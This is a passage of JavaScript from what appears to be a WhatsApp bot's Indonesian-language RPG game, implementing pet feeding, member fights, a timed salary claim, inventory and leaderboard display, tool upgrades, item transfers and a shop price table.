    let rubah = global.db.users[m.sender].fox
    let kuda = global.db.users[m.sender].horse
    let kucing = global.db.users[m.sender].cat
    let anjing = global.db.users[m.sender].dog
    let robot = global.db.users[m.sender].robo
    switch (type) {
        case 'fox':
            if (rubah == 0) return replygcxeon('ʏᴏᴜ ᴅᴏɴ\'ᴛ ʜᴀᴠᴇ ᴛʜɪs ᴘᴇᴛ ʏᴇᴛ!')
            if (rubah == 10) return replygcxeon('ʏᴏᴜʀ ᴘᴇᴛ ɪs ᴍᴀx ʟᴇᴠᴇʟ !')
            let __waktur = (new Date - user.foxlastfeed)
            let _waktur = (10000 - __waktur)
            let waktur = clockString(_waktur)
            if (new Date - user.foxlastfeed > 10000) {
                if (user.petfood > 0) {
                    user.petfood -= 1
                    user.foxexp += 20
                    user.foxlastfeed = new Date * 1
                    replygcxeon(`ғᴇᴇᴅɪɴɢ *${type}*...\n*${emo} ${type.capitalize()}:* ${pesan}`)
                    if (rubah > 0) {
                        let naiklvl = ((rubah * 100) - 1)
                        if (user.foxexp > naiklvl) {
                            user.fox += 1
                            user.foxexp -= (rubah * 100)
                            replygcxeon(`*ᴄᴏɴɢʀᴀᴛs!* , ʏᴏᴜʀ ᴘᴇᴛ ʟᴇᴠᴇʟᴜᴘ`)
                        }
                    }
                } else replygcxeon(`ʏᴏᴜʀ ᴘᴇᴛ ғᴏᴏᴅ ɴᴏᴛ ᴇɴᴏᴜɢʜ`)
            } else replygcxeon(`ʏᴏᴜʀ ᴘᴇᴛ ɪs ғᴜʟʟ, ᴛʀʏ ғᴇᴇᴅɪɴɢ ɪᴛ ᴀɢᴀɪɴ ɪɴ\n➞ *${waktur}*`)
            break
        case 'cat':
            if (kucing == 0) return replygcxeon('ʏᴏᴜ ᴅᴏɴ\'ᴛ ʜᴀᴠᴇ ᴛʜɪs ᴘᴇᴛ ʏᴇᴛ!')
            if (kucing == 10) return replygcxeon('ʏᴏᴜʀ ᴘᴇᴛ ɪs ᴍᴀx ʟᴇᴠᴇʟ !')
            let __waktuc = (new Date - user.catlastfeed)
            let _waktuc = (10000 - __waktuc)
            let waktuc = clockString(_waktuc)
            if (new Date - user.catlastfeed > 10000) {
                if (user.petfood > 0) {
                    user.petfood -= 1
                    user.catexp += 20
                    user.catlastfeed = new Date * 1
                    replygcxeon(`ғᴇᴇᴅɪɴɢ *${type}*...\n*${emo} ${type.capitalize()}:* ${pesan}`)
            
                    if (kucing > 0) {
                        let naiklvl = ((kucing * 100) - 1)
                        if (user.catexp > naiklvl) {
                            user.cat += 1
                            user.catexp -= (kucing * 100)
                            replygcxeon(`*ᴄᴏɴɢʀᴀᴛs!* , ʏᴏᴜʀ ᴘᴇᴛ ʟᴇᴠᴇʟᴜᴘ`)
                        }
                    }
                } else replygcxeon(`ʏᴏᴜʀ ᴘᴇᴛ ғᴏᴏᴅ ɴᴏᴛ ᴇɴᴏᴜɢʜ`)
            } else replygcxeon(`ʏᴏᴜʀ ᴘᴇᴛ ɪs ғᴜʟʟ, ᴛʀʏ ғᴇᴇᴅɪɴɢ ɪᴛ ᴀɢᴀɪɴ ɪɴ\n➞ *${waktuc}*`)
            break
        case 'dog':
            if (anjing == 0) return replygcxeon('ʏᴏᴜ ᴅᴏɴ\'ᴛ ʜᴀᴠᴇ ᴛʜɪs ᴘᴇᴛ ʏᴇᴛ!')
            if (anjing == 10) return replygcxeon('ʏᴏᴜʀ ᴘᴇᴛ ɪs ᴍᴀx ʟᴇᴠᴇʟ !')
            let __waktua = (new Date - user.doglastfeed)
            let _waktua = (10000 - __waktua)
            let waktua = clockString(_waktua)
            if (new Date - user.doglastfeed > 10000) {
                if (user.petfood > 0) {
                    user.petfood -= 1
                    user.dogexp += 20
                    user.doglastfeed = new Date * 1
                    replygcxeon(`ғᴇᴇᴅɪɴɢ *${type}*...\n*${emo} ${type.capitalize()}:* ${pesan}`)
                    if (anjing > 0) {
                        let naiklvl = ((anjing * 100) - 1)
                        if (user.dogexp > naiklvl) {
                            user.dog += 1
                            user.dogexp -= (anjing * 100)
                            replygcxeon(`*ᴄᴏɴɢʀᴀᴛs!* , ʏᴏᴜʀ ᴘᴇᴛ ʟᴇᴠᴇʟᴜᴘ`)
                        }
                    }
                } else replygcxeon(`ʏᴏᴜʀ ᴘᴇᴛ ғᴏᴏᴅ ɴᴏᴛ ᴇɴᴏᴜɢʜ`)
            } else replygcxeon(`ʏᴏᴜʀ ᴘᴇᴛ ɪs ғᴜʟʟ, ᴛʀʏ ғᴇᴇᴅɪɴɢ ɪᴛ ᴀɢᴀɪɴ ɪɴ\n➞ *${waktua}*`)
            break
        case 'horse':
            if (kuda == 0) return replygcxeon('ʏᴏᴜ ᴅᴏɴ\'ᴛ ʜᴀᴠᴇ ᴛʜɪs ᴘᴇᴛ ʏᴇᴛ!')
            if (kuda == 10) return replygcxeon('ʏᴏᴜʀ ᴘᴇᴛ ɪs ᴍᴀx ʟᴇᴠᴇʟ !')
            let __waktuk = (new Date - user.horselastfeed)
            let _waktuk = (10000 - __waktuk)
            let waktuk = clockString(_waktuk)
            if (new Date - user.horselastfeed > 10000) {
                if (user.petfood > 0) {
                    user.petfood -= 1
                    user.horseexp += 20
                    user.horselastfeed = new Date * 1
                    replygcxeon(`ғᴇᴇᴅɪɴɢ *${type}*...\n*${emo} ${type.capitalize()}:* ${pesan}`)
                    if (kuda > 0) {
                        let naiklvl = ((kuda * 100) - 1)
                        if (user.horseexp > naiklvl) {
                            user.horse += 1
                            user.horseexp -= (kuda * 100)
                            replygcxeon(`*ᴄᴏɴɢʀᴀᴛs!* , ʏᴏᴜʀ ᴘᴇᴛ ʟᴇᴠᴇʟᴜᴘ`)
                        }
                    }
                } else replygcxeon(`ʏᴏᴜʀ ᴘᴇᴛ ғᴏᴏᴅ ɴᴏᴛ ᴇɴᴏᴜɢʜ`)
            } else replygcxeon(`ʏᴏᴜʀ ᴘᴇᴛ ɪs ғᴜʟʟ, ᴛʀʏ ғᴇᴇᴅɪɴɢ ɪᴛ ᴀɢᴀɪɴ ɪɴ\n➞ *${waktuk}*`)
            break
            case 'robo':
            if (robot == 0) return replygcxeon('ʏᴏᴜ ᴅᴏɴ\'ᴛ ʜᴀᴠᴇ ᴛʜɪs ᴘᴇᴛ ʏᴇᴛ!')
            if (robot == 10) return replygcxeon('ʏᴏᴜʀ ᴘᴇᴛ ɪs ᴍᴀx ʟᴇᴠᴇʟ !')
            let __wakturb = (new Date - user.robolastfeed)
            let _wakturb = (10000 - __wakturb)
            let wakturb = clockString(_wakturb)
            if (new Date - user.robolastfeed > 10000) {
                if (user.petfood > 0) {
                    user.petfood -= 1
                    user.roboexp += 20
                    user.robolastfeed = new Date * 1
                    replygcxeon(`ғᴇᴇᴅɪɴɢ *${type}*...\n*${emo} ${type.capitalize()}:* ${pesan}`)
                    if (robot > 0) {
                        let naiklvl = ((robot * 100) - 1)
                        if (user.roboexp > naiklvl) {
                            user.robo += 1
                            user.roboexp -= (robot * 100)
                            replygcxeon(`*ᴄᴏɴɢʀᴀᴛs!* , ʏᴏᴜʀ ᴘᴇᴛ ʟᴇᴠᴇʟᴜᴘ`)
                        }
                    }
                } else replygcxeon(`ʏᴏᴜʀ ᴘᴇᴛ ғᴏᴏᴅ ɴᴏᴛ ᴇɴᴏᴜɢʜ`)
            } else replygcxeon(`ʏᴏᴜʀ ᴘᴇᴛ ɪs ғᴜʟʟ, ᴛʀʏ ғᴇᴇᴅɪɴɢ ɪᴛ ᴀɢᴀɪɴ ɪɴ\n➞ *${wakturb}*`)
            break
        default:
            return replygcxeon(`${info}`)
    }
}
break
//==================================================================
case 'fighting':
 case 'fight': {
   if (!m.isGroup) return reply(mess.only.group)
    XeonBotInc.fight = XeonBotInc.fight ? XeonBotInc.fight: {}
    let user = global.db.users[m.sender]
    if (typeof XeonBotInc.fight[m.sender] != "undefined" && XeonBotInc.fight[m.sender] == true) return replygcxeon(`Kamu masih bertarung.`)
    let users = participants.map(a => a.id)
    var lawan
    lawan = users[Math.floor(users.length * Math.random())]
    while (typeof global.db.users[lawan] == "undefined" || lawan == m.sender) {
        lawan = users[Math.floor(users.length * Math.random())]
    }
    replygcxeon(`*Kamu* (level ${user.level}) menantang *${XeonBotInc.getName(lawan)}* (level ${global.db.users[lawan].level}) dan sedang dalam pertarungan.\n\nTunggu 5 menit lagi dan lihat siapa yg menang.`)
    XeonBotInc.fight[m.sender] = true
    await delay(300000)
    let kesempatan = []
    for (let i = 0; i < user.level; i++) kesempatan.push(m.sender)
    for (let i = 0; i < global.db.users[lawan].level; i++) kesempatan.push(lawan)
    let pointPemain = 0
    let pointLawan = 0
    for (let i = 0; i < 10; i++) {
        let unggul = getRandom(0, kesempatan.length - 1)
        if (kesempatan[unggul] == m.sender) pointPemain += 1
        else pointLawan += 1
    }
    if (pointPemain > pointLawan) {
        let hadiah = (pointPemain - pointLawan) * 10000
        user.money += hadiah
        user.limit += 1
        replygcxeon(`*${XeonBotInc.getName(m.sender)}* [${pointPemain * 10}] - [${pointLawan * 10}] *${XeonBotInc.getName(lawan)}*\n\n*Kamu* (level ${user.level}) menang melawan *${XeonBotInc.getName(lawan)}* (level ${global.db.users[lawan].level}) karena kamu ${alasanMenang[getRandom(0, alasanMenang.length - 1)]}\n\nHadiah . ${hadiah.toLocaleString()}\n+1 Limit`)
    } else if (pointPemain < pointLawan) {
        let denda = (pointLawan - pointPemain) * 100000
        user.money -= denda
        user.limit += 1
        replygcxeon(`*${XeonBotInc.getName(m.sender)}* [${pointPemain * 10}] - [${pointLawan * 10}] *${XeonBotInc.getName(lawan)}*\n\n*Kamu* (level ${user.level}) kalah melawan *${XeonBotInc.getName(lawan)}* (level ${global.db.users[lawan].level}) karena kamu ${alasanKalah[getRandom(0, alasanKalah.length - 1)]}\n\nMoney kamu berkurang ${denda.toLocaleString()}\n+1 Limit`)
    } else {
        replygcxeon(`*${XeonBotInc.getName(m.sender)}* [${pointPemain * 10}] - [${pointLawan * 10}] *${XeonBotInc.getName(lawan)}*\n\nHasil imbang kak, ga dapet apa apa`)
    }
    delete XeonBotInc.fight[m.sender]
}
break
//==================================================================
case 'gajian': {
  if (!m.isGroup) return reply(mess.only.group)
function JaM(ms) {
  let h = isNaN(ms) ? '60' : Math.floor(ms / 3600000) % 60
  return [h].map(v => v.toString().padStart(2, 0) ).join(':')
}

function MeNit(ms) {
  let m = isNaN(ms) ? '60' : Math.floor(ms / 60000) % 60
  return [m].map(v => v.toString().padStart(2, 0) ).join(':')
}

function DeTik(ms) {
  let s = isNaN(ms) ? '60' : Math.floor(ms / 1000) % 60
  return [s].map(v => v.toString().padStart(2, 0) ).join(':')
}

  let LastClaim = global.db.users[m.sender].lastclaim
  let cdm = `${MeNit(new Date - LastClaim)}`
  let cds = `${DeTik(new Date - LastClaim)}`
  let cd1 = Math.ceil(44 - cdm)
  let cd2 = Math.ceil(59 - cds)
  if (new Date - global.db.users[m.sender].lastclaim > 2700000) {
    global.db.users[m.sender].money += 50000
    global.db.users[m.sender].exp += 100
    replygcxeon('Nih gaji lu +Rp50000')
    global.db.users[m.sender].lastclaim = new Date * 1
  } else return replygcxeon(`Lu udah ambil jatah hari ini.\n\nTunggu ${cd1} Menit ${cd2} Detik!`)
}
break
//==================================================================
case 'me':
case 'inventory': {
  if (!m.isGroup) return reply(mess.only.group)
let inventory = {
  others: {
    joinlimit: true,
    health: true,
    money: true,
    chip: true,
    exp: true,
  },
  items: {
    bibitanggur: true,
    bibitmangga: true,
    bibitpisang: true,
    bibitapel: true,
    bibitjeruk: true,
    anggur: true,
    mangga: true,
    pisang: true,
    apel: true,
    jeruk: true,
    potion: true,
    trash: true,
    wood: true,
    rock: true,
    string: true,
    emerald: true,
    diamond: true,
    gold: true,
    iron: true,
    umpan: true,
    upgrader: true,
    pet: true,
    petfood: true,
  },
  durabi: {
    sworddurability: true,
    pickaxedurability: true,
    fishingroddurability: true,
    armordurability: true,
  },
  tools: {
    armor: {
      '0': '❌',
      '1': 'Leather Armor',
      '2': 'Iron Armor',
      '3': 'Gold Armor',
      '4': 'Diamond Armor',
      '5': 'Emerald Armor',
      '6': 'Crystal Armor',
      '7': 'Obsidian Armor',
      '8': 'Netherite Armor',
      '9': 'Wither Armor',
      '10': 'Dragon Armor',
      '11': 'Hacker Armor'
    },
    sword: {
      '0': '❌',
      '1': 'Wooden Sword',
      '2': 'Stone Sword',
      '3': 'Iron Sword',
      '4': 'Gold Sword',
      '5': 'Copper Sword',
      '6': 'Diamond Sword',
      '7': 'Emerald Sword',
      '8': 'Obsidian Sword',
      '9': 'Netherite Sword',
      '10': 'Samurai Slayer Green Sword',
      '11': 'Hacker Sword'
    },
    pickaxe: {
      '0': '❌',
      '1': 'Wooden Pickaxe',
      '2': 'Stone Pickaxe',
      '3': 'Iron Pickaxe',
      '4': 'Gold Pickaxe',
      '5': 'Copper Pickaxe',
      '6': 'Diamond Pickaxe',
      '7': 'Emerlad Pickaxe',
      '8': 'Crystal Pickaxe',
      '9': 'Obsidian Pickaxe',
      '10': 'Netherite Pickaxe',
      '11': 'Hacker Pickaxe'
    },
    fishingrod: {
      '0': '❌',
      '1': 'Wooden Fishingrod',
      '2': 'Stone Fishingrod',
      '3': 'Iron Fishingrod',
      '4': 'Gold Fishingrod',
      '5': 'Copper Fishingrod',
      '6': 'Diamond Fishingrod',
      '7': 'Emerald Fishingrod',
      '8': 'Crystal Fishingrod',
      '9': 'Obsidian Fishingrod',
      '10': 'God Fishingrod',
      '11': 'Hacker Fishingrod'
     }
  },
  crates: {
    common: true,
    uncommon: true,
    mythic: true,
    legendary: true,
  },
  pets: {
    horse: 10,
    cat: 10,
    fox: 10,
    dog: 10,
    robo: 10,
  },
  cooldowns: {}
}

  let who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? XeonBotInc.user.jid : m.sender
  let user = global.db.users[who]

  if (!(who in global.db.users)) return replygcxeon(`User ${who} not in database`)

  let sortedlevel = Object.entries(global.db.users).sort((a, b) => b[1].level - a[1].level)
  let userslevel = sortedlevel.map(v => v[0])
  let sortedchip = Object.entries(global.db.users).sort((a, b) => b[1].chip - a[1].chip)
  let userschip = sortedchip.map(v => v[0])
  let sortedmoney = Object.entries(global.db.users).sort((a, b) => b[1].money - a[1].money)
  let usersmoney = sortedmoney.map(v => v[0])
  let sorteddiamond = Object.entries(global.db.users).sort((a, b) => b[1].diamond - a[1].diamond)
  let usersdiamond = sorteddiamond.map(v => v[0])
  let sortedbank = Object.entries(global.db.users).sort((a, b) => b[1].bank - a[1].bank)
  let usersbank = sortedbank.map(v => v[0])
  let sortedgold = Object.entries(global.db.users).sort((a, b) => b[1].gold - a[1].gold)
  let usersgold = sortedgold.map(v => v[0])

  let isMods = [XeonBotInc.decodeJid(XeonBotInc.user.id), ...global.owner.filter(([number, _, isDeveloper]) => number && isDeveloper).map(([number]) => number)].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(who)
  let isOwner = m.fromMe || isMods || [XeonBotInc.decodeJid(XeonBotInc.user.id), ...global.owner.filter(([number, _, isDeveloper]) => number && !isDeveloper).map(([number]) => number)].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(who)
  let isPrems =  isOwner || new Date() - user.premiumTime < 0

  let limit = isPrems ? 'Unlimited' : user.limit
  let tools = Object.keys(inventory.tools).map(v => user[v] && `*${global.rpg.emoticon(v)} ${v}:* ${typeof inventory.tools[v] === 'object' ? inventory.tools[v][user[v]?.toString()] : `Level(s) ${user[v]}`}`).filter(v => v).join('\n').trim()
  let items = Object.keys(inventory.items).map(v => user[v] && `*${global.rpg.emoticon(v)} ${v}:* ${user[v]}`).filter(v => v).join('\n').trim()
  let dura = Object.keys(inventory.durabi).map(v => user[v] && `*${global.rpg.emoticon(v)} ${v}:* ${user[v]}`).filter(v => v).join('\n').trim()
  let crates = Object.keys(inventory.crates).map(v => user[v] && `*${global.rpg.emoticon(v)} ${v}:* ${user[v]}`).filter(v => v).join('\n').trim()
  let pets = Object.keys(inventory.pets).map(v => user[v] && `*${global.rpg.emoticon(v)} ${v}:* ${user[v] >= inventory.pets[v] ? 'Max Levels' : `Level(s) ${user[v]}`}`).filter(v => v).join('\n').trim()
  let cooldowns = Object.entries(inventory.cooldowns).map(([cd, { name, time }]) => cd in user && `*✧ ${name}*: ${new Date() - user[cd] >= time ? '✅' : '❌'}`).filter(v => v).join('\n').trim()

  let caption = `
🧑🏻‍🏫 ᴜsᴇʀ: *${user.registered ? user.name : XeonBotInc.getName(who)}* ${user.level ? `
➠ ${global.rpg.emoticon('level')} level: ${user.level}` : ''} ${user.limit ? `
➠ ${global.rpg.emoticon('limit')} limit: ${limit}` : ''}
${Object.keys(inventory.others).map(v => user[v] && `➠ ${global.rpg.emoticon(v)} ${v}: ${user[v]}`).filter(v => v).join('\n')} ${tools ? `

*ʟɪꜱᴛ ᴛᴏᴏʟs* :
${tools}` : ''}${items ? `

*ʟɪꜱᴛ ɪᴛᴇᴍs* :
${items}` : ''}${crates ? `

*ʟɪꜱᴛ ᴄʀᴀᴛᴇs* :
${crates}` : ''}${pets ? `

*ʟɪꜱᴛ ᴩᴇᴛs* :
${pets}` : ''}${cooldowns ? `

*ʟɪꜱᴛ ᴀʀᴄʜɪᴇᴠᴇᴍᴇɴᴛ* :
${global.rpg.emoticon('chip')} ᴛᴏᴘ ᴄʜɪᴘ *${userschip.indexOf(who) + 1}* ᴅᴀʀɪ *${userschip.length}*
${global.rpg.emoticon('money')} ᴛᴏᴘ ᴍᴏɴᴇʏ *${usersmoney.indexOf(who) + 1}* ᴅᴀʀɪ *${usersmoney.length}*
${global.rpg.emoticon('bank')} ᴛᴏᴘ ʙᴀɴᴋ *${usersbank.indexOf(who) + 1}* ᴅᴀʀɪ *${usersbank.length}*
${global.rpg.emoticon('level')} ᴛᴏᴘ ʟᴇᴠᴇʟ *${userslevel.indexOf(who) + 1}* ᴅᴀʀɪ *${userslevel.length}*
${global.rpg.emoticon('diamond')} ᴛᴏᴘ ᴅɪᴀᴍᴏɴᴅ *${usersdiamond.indexOf(who) + 1}* ᴅᴀʀɪ *${usersdiamond.length}*
${global.rpg.emoticon('gold')} ᴛᴏᴘ ɢᴏʟᴅ *${usersgold.indexOf(who) + 1}* ᴅᴀʀɪ *${usersgold.length}*

♻️ *ᴄᴏʟʟᴇᴄᴛ ʀᴇᴡᴀʀᴅs* :
${cooldowns}` : ''}
*✧ dungeon: ${user.lastdungeon == 0 ? '✅': '❌'}*
*✧ mining: ${user.lastmining == 0 ? '✅': '❌'}*
`.trim()

    replygcxeon(`${caption}`)
}
break
//==================================================================
case 'upgrade': {
  if (!m.isGroup) return reply(mess.only.group)
        let user = global.db.users[m.sender]
        let wood = user.wood * 1
        let rock = user.rock * 1
        let string = user.string * 1
        let money = user.money * 1
        let iron = user.iron * 1
        let fishingrod = user.fishingrod * 1
        let pickaxe = user.pickaxe * 1
        let sword = user.sword * 1
        let diamond = user.diamond * 1
        let emerald = user.emerald * 1
        let armor = user.armor * 1
        let atm = user.atm
        let type = (args[0] || '').toLowerCase()
        let prefix = command
        
        let teks = `█▀▀▀▀█▀▀▀▀█▀▀▀▀█
█────█────█────█
█▄▄▄▄█▄▄▄▄█▄▄▄▄█
█▀▀▀▀█▀▀▀▀█▀▀▀▀█
█────█────█────█
█▄▄▄▄█▄▄▄▄█▄▄▄▄█
█▀▀▀▀█▀▀▀▀█▀▀▀▀█
█────█────█────█
█▄▄▄▄█▄▄▄▄█▄▄▄▄█

Gunakan Format *${command} [type]*
contoh *${command} fishingRod*

*📌List yang Bisa Di Upgrade*
${rpg.emoticon('fishingrod')}FishingRod
${rpg.emoticon('pickaxe')}Pickaxe
${rpg.emoticon('sword')}Sword
${rpg.emoticon('armor')}Armor
${rpg.emoticon('atm')}Atm
`.trim()
        
        switch (type) {
            case 'fishingrod':
                if (fishingrod == 0) {
                    let lmao = `anda belum memiliki *🎣FishingRod*
untuk mendapatkannya ketik *${command}craft fishingrod*`
                    return reply(`${lmao}`)
                }
                if (fishingrod > 9) return reply(`*${rpg.emoticon('fishingrod')}FishingRod* kamu sudah level max`)
                let _wood = fishingrod * 100
                let _string = fishingrod * 100
                let _money = fishingrod * 1000000
                if (wood < _wood || string < _string || money < _money) return reply(`Material kamu kurang!!${wood < _wood ? `\n${rpg.emoticon('wood')}wood Kamu Kurang *${_wood - wood}*` : ''}${string < _string ? `\n${rpg.emoticon('string')}String Kamu Kurang *${_string - string}*` : ''}${user.money < _money ? `\n${rpg.emoticon('money')}Uang Kamu Kurang *${_money - money}*` : ''}`)
                user.fishingrod += 1
                user.wood -= _wood * 1
                user.string -= _string * 1
                user.money -= _money * 1
                user.fishingroddurability = 0 
                user.fishingroddurability += fishingrod * 50
                reply(`Succes mengupgrade *${rpg.emoticon('fishingrod')}FishingRod*`)
                break
            case 'pickaxe':
                if (pickaxe == 0) {
                    let lmao = `anda belum memiliki *${rpg.emoticon('pickaxe')}Pickaxe*
untuk memilikinya ketik *${command}craft Pickaxe*`
                    return reply(`${lmao}`)
                }
                if (pickaxe > 9) return reply(`*${rpg.emoticon('pickaxe')}Pickaxe* kamu sudah level max!!`)
                let __rock = pickaxe * 250
                let __wood = pickaxe * 150
                let __money = pickaxe * 1500000
                if (rock < __rock || wood < __wood || money < __money) return reply(`
Material Anda Kurang!!
${rock < __rock ? `\n${rpg.emoticon('rock')}rock kamu kurang *${__rock - rock}*` : ''}${wood < __wood ? `\n${rpg.emoticon('wood')}wood kamu kurang *${__wood - wood}*` : ''}${money < __money ? `\n${rpg.emoticon('money')}Uang kamu kurang *${__money - money}*` : ''}`)
                user.pickaxe += 1
                user.wood -= __wood * 1
                user.rock -= __rock * 1
                user.money -= __money * 1
                user.pickaxedurability = 0
                user.pickaxedurability += pickaxe * 50
                reply(`Succes mengupgrade *${rpg.emoticon('pickaxe')}Pickaxe*`)
                break
            case 'sword':
                if (sword == 0) {
                    let lmao = `anda belum memiliki *${rpg.emoticon('sword')}Sword*
untuk memilikinya ketik *${command}craft sword*`
                    return reply(`${lmao}`)
                }
                if (sword > 9) return reply(`*${rpg.emoticon('sword')}Sword* kamu sudah level max!!`)
                let _iron = sword * 250
                let ___wood = sword * 150
                let ___money = sword * 1000000
                if (iron < _iron || wood < ___wood || money < ___money) return reply(`
Material Anda Kurang!!
${iron < _iron ? `\n${rpg.emoticon('iron')}Iron kamu kurang *${_iron - iron}*` : ''}${wood < ___wood ? `\n${rpg.emoticon('wood')}wood kamu kurang *${___wood - wood}*` : ''}${money < ___money ? `\n${rpg.emoticon('money')}Uang kamu kurang *${___money - money}*` : ''}`)
                user.sword += 1
                user.iron -= _iron * 1
                user.wood -= ___wood * 1
                user.money -= ___money * 1
                user.sworddurability = 0 
                user.sworddurability += sword * 50 
                reply(`Succes mengupgrade *${rpg.emoticon('sword')}Sword*`)
                break
                case 'armor':
                if (armor == 0) {
                    let lmao = `anda belum memiliki *${rpg.emoticon('armor')}Armor*
untuk memilikinya ketik *${command}craft armor*`
                    return reply(`${lmao}`)
                }
                if (armor > 9) return reply(`*${rpg.emoticon('armor')}Armor* kamu sudah level max!!`)
                let _diamond = armor * 5
                let ____wood = armor * 150
                let ____money = armor * 1000000
                if (diamond < _diamond || wood < ____wood || money < ____money) return reply(`
Material Anda Kurang!!
${diamond < _diamond ? `\n${rpg.emoticon('diamond')}Diamond kamu kurang *${_diamond - diamond}*` : ''}${wood < ____wood ? `\n${rpg.emoticon('wood')}wood kamu kurang *${____wood - wood}*` : ''}${money < ____money ? `\n${rpg.emoticon('money')}Uang kamu kurang *${____money - money}*` : ''}`)
                user.armor += 1
                user.diamond -= _diamond * 1
                user.wood -= ____wood * 1
                user.money -= ____money * 1
                user.armordurability = 0 
                user.armordurability += sword * 50 
                reply(`Succes mengupgrade *${rpg.emoticon('armor')}Armor*`)
                break
                case 'atm':
                if (atm == 0) {
                    let lmao = `anda belum memiliki *${rpg.emoticon('atm')}Atm*
untuk memilikinya ketik *${command}craft atm*`
                    return reply(`${lmao}`)
                }
                if (atm > 999) return reply(`*${rpg.emoticon('atm')}Atm* kamu sudah level max!!`)
                let __diamond = atm * 3
                let _emerald = atm * 5
                let _____money = atm * 10000
                if (diamond < __diamond || emerald < _emerald || money < _____money) return reply(`
Material Anda Kurang!!
${diamond < __diamond ? `\n${rpg.emoticon('diamond')}Diamond kamu kurang *${__diamond - diamond}*` : ''}${emerald < _emerald ? `\n${rpg.emoticon('emerald')}Emerald kamu kurang *${_emerald - emerald}*` : ''}${money < _____money ? `\n${rpg.emoticon('money')}Uang kamu kurang *${_____money - money}*` : ''}`)
                user.atm += 1
                user.diamond -= __diamond * 1
                user.emerald -= _emerald * 1
                user.money -= _____money * 1
                user.fullatm = 0 
                user.fullatm += atm * 500000000
                reply(`Succes mengupgrade *${rpg.emoticon('atm')}Atm*`)
                break
            default :
                return reply(`${teks}`)
        }
}
break
//==================================================================
case 'transfer': {
  if (!m.isGroup) return reply(mess.only.group)
function special(type) {
    let b = type.toLowerCase()
    let special = (['common', 'uncommon', 'mythic', 'legendary', 'pet'].includes(b) ? ' Crate' : '')
    return special
}

function isNumber(x) {
    return !isNaN(x)
}
const items = [
    'money', 'bank', 'potion', 'trash', 'wood',
    'rock', 'string', 'petFood', 'emerald',
    'diamond', 'gold', 'iron', 'common',
    'uncommon', 'mythic', 'legendary', 'pet', 'chip', 
    'anggur', 'apel', 'jeruk', 'mangga', 'pisang', 
    'bibitanggur', 'bibitapel', 'bibitjeruk', 'bibitmangga', 'bibitpisang',
]
    let user = global.db.users[m.sender]
    const item = items.filter(v => v in user && typeof user[v] == 'number')
    let lol = `Use format ${command} [type] [value] [number]
example ${command} money 9999 @621927237001

📍 Transferable items
${item.map(v => `${rpg.emoticon(v)}${v}`.trim()).join('\n')}
`.trim()
    const type = (args[0] || '').toLowerCase()
    if (!item.includes(type)) return reply(lol)
    const count = Math.min(Number.MAX_SAFE_INTEGER, Math.max(1, (isNumber(args[1]) ? parseInt(args[1]) : 1))) * 1
    let who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : args[2] ? (args[2].replace(/[@ .+-]/g, '') + '@s.whatsapp.net') : ''
    let _user = global.db.users[who]
    if (!who) return m.reply('Tag salah satu, atau ketik Nomernya!!')
    if (!(who in global.db.users)) return m.reply(`User ${who} not in database`)
    if (user[type] * 1 < count) return m.reply(`Your *${rpg.emoticon(type)}${type}${special(type)}* is less *${count - user[type]}*`)
    let previous = user[type] * 1
    let _previous = _user[type] * 1
    user[type] -= count * 1
    _user[type] += count * 1
    if (previous > user[type] * 1 && _previous < _user[type] * 1) m.reply(`*––––––『 𝚃𝚁𝙰𝙽𝚂𝙵𝙴𝚁 』––––––*\n*📊 Status:* Succes\n*🗂️ Type:* ${type}${special(type)} ${rpg.emoticon(type)}\n*🧮 Count:* ${count}\n*📨 To:* @${(who || '').replace(/@s\.whatsapp\.net/g, '')}`, null, { mentions: [who] })
    else {
        user[type] = previous
        _user[type] = _previous
        m.reply(`*––––––『 TRANSFER 』––––––*\n*📊 Status:* Failted\n*📍 Item:* ${count} ${rpg.emoticon(type)}${type}${special(type)}\n*📨 To:* @${(who || '').replace(/@s\.whatsapp\.net/g, '')}`, null, { mentions: [who] })
    }
}
break
//==================================================================
case 'shop': {
  if (!m.isGroup) return reply(mess.only.group)
function isNumber(number) {
    if (!number) return number
    number = parseInt(number)
    return typeof number == 'number' && !isNaN(number)
}

function capitalize(word) {
  return word.charAt(0).toUpperCase() + word.substr(1)
}
const items = {
    buy: {
        limit: {
            exp: 9999
        },
        chip: {
        	money: 1000000
        },
        exp: {
        	money: 1000
        },
        potion: {
            money: 1250
        },
        trash: {
            money: 40
        },
        wood: {
            money: 700
        },
        rock: {
            money: 850
        },
        string: {
            money: 400
        },
        iron: { 
        	money: 3000
        },
        diamond: {
            money: 500000
        },
        emerald: {
            money: 100000
        },
        gold: {
            money: 100000
        },
        common: {
            money: 2000
        },
        uncommon: {
            money: 20000
        },
        mythic: {
            money: 75000
        },
        legendary: {
            money: 200000
        },
        petfood: {
            money: 3500
        },
        pet: {
            money: 120000
        },
        anggur: {
            money: 2000
        },
        apel: {
            money: 2000
        },
        jeruk: {
            money: 2000
        },
        mangga: {
            money: 2000
        },
        pisang: {
        	money: 2000
        },
        bibitanggur: {
            money: 2000
        },
        bibitapel: {
            money: 2000
        },
        bibitjeruk: {
            money: 2000
        },
        bibitmangga: {
            money: 2000
        },
        bibitpisang: {
            money: 2000
        },
        umpan: {
        	money: 5000
        }     
    },
    sell: {
        limit: {
            exp: 999
        },
        exp: {
        	money: 1
        },
        chip: {
        	money: 1000000
        },
        potion: {
            money: 625
        },
        trash: {
            money: 20
        },
        wood: {
            money: 350
        },
        rock: {
            money: 425
        },
        string: {
            money: 200
        },
        iron: { 
        	money: 1500
        },
        diamond: {
            money: 250000
        },
        emerald: {
            money: 50000
        },
        gold: {
            money: 50000
        },
        common: {
            money: 1000
        },
        uncommon: {
            money: 10000
        },
        mythic: {
            money: 37500
        },
        legendary: {
            money: 100000
        },
        petfood: {
            money: 1750
        },
        pet: {
            money: 60000
        },
        anggur: {
            money: 1000
        },
        apel: {
            money: 1000
        },
        jeruk: {
            money: 1000
        },
        mangga: {
            money: 1000
        },
        pisang: {
        	money: 1000
        },
        bibitanggur: {
            money: 1000
        },
        bibitapel: {
            money: 1000
        },
        bibitjeruk: {
            money: 1000
        },
        bibitmangga: {
            money: 1000
        },
        bibitpisang: {
            money: 1000
        },
        umpan: {
        	money: 2500
        }
    }
}

    const item = (args[0] || '').toLowerCase()
    if (!item.match('limit') && db.chats[m.chat].rpg == false && m.isGroup) return dfail('rpg', m, XeonBotInc)
